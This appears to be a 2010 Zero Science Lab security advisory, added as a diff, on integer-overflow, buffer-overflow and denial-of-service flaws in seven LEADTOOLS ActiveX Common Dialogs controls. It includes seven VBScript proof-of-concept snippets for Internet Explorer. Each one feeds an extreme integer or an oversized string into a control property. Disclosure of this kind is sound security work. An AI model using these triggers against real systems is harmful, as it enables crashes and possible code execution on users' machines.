@@ -1,0 +1,152 @@
+LEADTOOLS ActiveX Common Dialogs 16.5 Multiple Remote Vulnerabilities
+
+Vendor: LEAD Technologies, Inc.
+Product Web Page: http://www.leadtools.com
+Affected version: 16.5.0.2
+
+Summary: With LEADTOOLS you can control any scanner, digital camera
+or capture card that has a TWAIN (32 and 64 bit) device driver.
+High-level acquisition support is included for ease of use while
+low-level functionality is provided for flexibility and control in
+even the most demanding scanning applications.
+
+Desc: LEADTOOLS ActiveX Common Dialogs suffers from multiple remote
+vulnerabilities (IoF, BoF, DoS) as it fails to sanitize the input in
+different objects included in the Common Dialogs class.
+
+Vulnerable Objects/OCX Dialogs (Win32):
+
+	1. ActiveX Common Dialogs (Web) --------------------> LtocxWebDlgu.dll
+	2. ActiveX Common Dialogs (Effects) ----------------> LtocxEfxDlgu.dll
+	3. ActiveX Common Dialogs (Image) ------------------> LtocxImgDlgu.dll
+	4. ActiveX Common Dialogs (Image Effects) ----------> LtocxImgEfxDlgu.dll
+	5. ActiveX Common Dialogs (Image Document)----------> LtocxImgDocDlgu.dll
+	6. ActiveX Common Dialogs (Color) ------------------> LtocxClrDlgu.dll
+	7. ActiveX Common Dialogs (File) -------------------> LtocxFileDlgu.dll
+
+- RegKey Safe for Script: True
+- RegKey Safe for Init: True
+
+Tested On: Microsoft Windows XP Professional SP3 (EN)
+           Windows Internet Explorer 8.0.6001.18702
+           RFgen Mobile Development Studio 4.0.0.06 (Enterprise)
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+liquidworm gmail com
+
+Zero Science Lab - http://www.zeroscience.mk
+
+24.08.2010
+
+Zero Science Lab Advisory ID: ZSL-2010-4961
+
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2010-4961.php
+
+##############################################################
+			Proof of Concept:
+##############################################################
+
+1. (Web, LtocxWebDlgu.dll / LTRDWU.DLL):
+------------------------------------------------------
+
+ <object classid='clsid:00165B53-B1BA-11CE-ABC6-F5B2E79D9E3F' id='target' />
+ <script language='vbscript'>
+ targetFile = "C:\Program Files\RFGen40\LtocxWebDlgu.dll"
+ prototype  = "Property Let Bitmap As Long"
+ memberName = "Bitmap"
+ progid     = "LTRASTERDLGWEBLib_U.LEADRasterDlgWeb_U"
+ argCount   = 1
+ arg1=-1
+ target.Bitmap = arg1
+ </script>
+
+
+2. (Effects, LtocxEfxDlgu.dll / LTRDEU.DLL):
+------------------------------------------------------
+
+ <object classid='clsid:00165B5B-B1BA-11CE-ABC6-F5B2E79D9E3F' id='target' />
+ <script language='vbscript'>
+ targetFile = "C:\Program Files\RFGen40\LtocxEfxDlgu.dll"
+ prototype  = "Property Let Bitmap As Long"
+ memberName = "Bitmap"
+ progid     = "LTRASTERDLGEFXLib_U.LEADRasterDlgEfx_U"
+ argCount   = 1
+ arg1=-1
+ target.Bitmap = arg1
+ </script>
+
+
+3. (Image, LtocxImgDlgu.dll / LTRDMU.DLL):
+------------------------------------------------------
+
+ <object classid='clsid:00165C7B-B1BA-11CE-ABC6-F5B2E79D9E3F' id='target' />
+ <script language='vbscript'>
+ targetFile = "C:\Program Files\RFGen40\LtocxImgDlgu.dll"
+ prototype  = "Property Let Bitmap As Long"
+ memberName = "Bitmap"
+ progid     = "LTRASTERDLGIMGLib_U.LEADRasterDlgImg_U"
+ argCount   = 1
+ arg1=2147483647
+ target.Bitmap = arg1
+ </script>
+
+
+4. (Image Effects, LtocxImgEfxDlgu.dll / LTRDXU.DLL):
+------------------------------------------------------
+
+ <object classid='clsid:00165B57-B1BA-11CE-ABC6-F5B2E79D9E3F' id='target' />
+ <script language='vbscript'>
+ targetFile = "C:\Program Files\RFGen40\LtocxImgEfxDlgu.dll"
+ prototype  = "Property Let Bitmap As Long"
+ memberName = "Bitmap"
+ progid     = "LTRASTERDLGIMGEFXLib_U.LEADRasterDlgImgEfx_U"
+ argCount   = 1
+ arg1=-2147483647
+ target.Bitmap = arg1
+ </script>
+
+
+5. (Image Document, LtocxImgDocDlgu.dll / LTRDOU.DLL):
+------------------------------------------------------
+
+ <object classid='clsid:00165B69-B1BA-11CE-ABC6-F5B2E79D9E3F' id='target' />
+ <script language='vbscript'>
+ targetFile = "C:\Program Files\RFGen40\LtocxImgDocDlgu.dll"
+ prototype  = "Property Let Bitmap As Long"
+ memberName = "Bitmap"
+ progid     = "LTRASTERDLGIMGDOCLib_U.LEADRasterDlgImgDoc_U"
+ argCount   = 1
+ arg1=2147483647
+ target.Bitmap = arg1
+ </script>
+
+
+6. (Color, LtocxClrDlgu.dll / LTRDRU.DLL):
+------------------------------------------------------
+
+ <object classid='clsid:00165B4F-B1BA-11CE-ABC6-F5B2E79D9E3F' id='target' />
+ <script language='vbscript'>
+ targetFile = "C:\Program Files\LEAD Technologies\LEADTOOLS Active-X 16.5\Bin\CDLL\Win32\LtocxClrDlgu.dll"
+ prototype  = "Property Let UserPalette ( ByVal iIndex As Integer ) As Long"
+ memberName = "UserPalette"
+ progid     = "LTRASTERDLGCLRLib_U.LEADRasterDlgClr_U"
+ argCount   = 2
+ arg1=1
+ arg2=-2147483647
+ target.UserPalette(arg1 ) = arg2
+ </script>
+
+
+7. (File, LtocxFileDlgu.dll / LTRDFU.DLL):
+------------------------------------------------------
+
+ <object classid='clsid:00165C87-B1BA-11CE-ABC6-F5B2E79D9E3F' id='target' />
+ <script language='vbscript'>
+ targetFile = "C:\Program Files\RFGen40\LtocxFileDlgu.dll"
+ prototype  = "Property Let DestinationPath As String"
+ memberName = "DestinationPath"
+ progid     = "LTRASTERDLGFILELib_U.LEADRasterDlgFile_U"
+ argCount   = 1
+ arg1=String(9236, "A")
+ target.DestinationPath = arg1
+ </script>
